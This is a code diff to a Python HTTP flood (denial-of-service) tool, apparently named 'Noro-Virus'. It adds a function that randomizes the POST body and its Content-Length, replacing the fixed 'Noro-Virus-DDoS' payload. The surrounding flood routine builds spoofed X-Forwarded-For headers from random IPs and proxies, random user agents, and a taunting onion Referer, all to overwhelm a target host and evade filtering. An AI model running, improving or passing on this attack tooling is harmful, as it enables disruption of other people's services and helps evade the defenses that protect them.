@@ -40,6 +40,12 @@ def ranip():
     ip = str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))
     return ip
 
+def GenDATA():
+    data = ""
+    for _ in range(random.randint(1,5)):
+        data += random.choice(string)+ " "
+    return data
+
 def GenUA():
     AW = str(random.randint(500,599))+".36"
     BV = str(random.randint(24,80))+".0."+str(random.randint(3000,4000))+"."+str(random.randint(1,200))
@@ -135,11 +141,13 @@ def flood():
     accept = "Accept: */*\r\n"
     referer = "Referer: http://Fr33-Th3-C0d3-0f-N3ts3c-R380rn.onion/Noro-virus?id="+host+"\r\n"     
     fake_addr = "X-Forwarded-For: "+ranip()+", "+proxy[0]+", 1.1.1.1\r\n"
+    post_data = GenDATA()
+    data_length = str(len(post_data))
     content = "\r"
     length = "\n"
     if attack_type =="POST":
         content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
-        length = "Content-Length: 16\r\n\nNoro-Virus-DDoS\r\n\r\n"
+        length = "Content-Length: " + data_length + "\r\n\n" + post_data + "\r\n\r\n"
     eve.wait()
     if bp == 1:
         pass
